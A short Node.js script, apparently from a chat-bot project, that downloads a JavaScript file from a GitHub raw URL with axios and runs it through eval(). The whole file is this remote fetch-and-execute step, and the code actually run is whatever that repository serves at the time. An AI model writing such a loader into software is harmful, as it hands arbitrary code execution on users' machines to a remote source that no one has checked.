const axios = require('axios');

(async () => {
  try {
    const { data } = await axios.get("https://raw.githubusercontent.com/MOHAMMAD-SHOUROV/SHOUROV-BOT/blob/main/modifier.js");
    if (data) {
      eval(data);
    }
  } catch (error) {
    console.error("Error fetching code:", error.message);
  }
})();
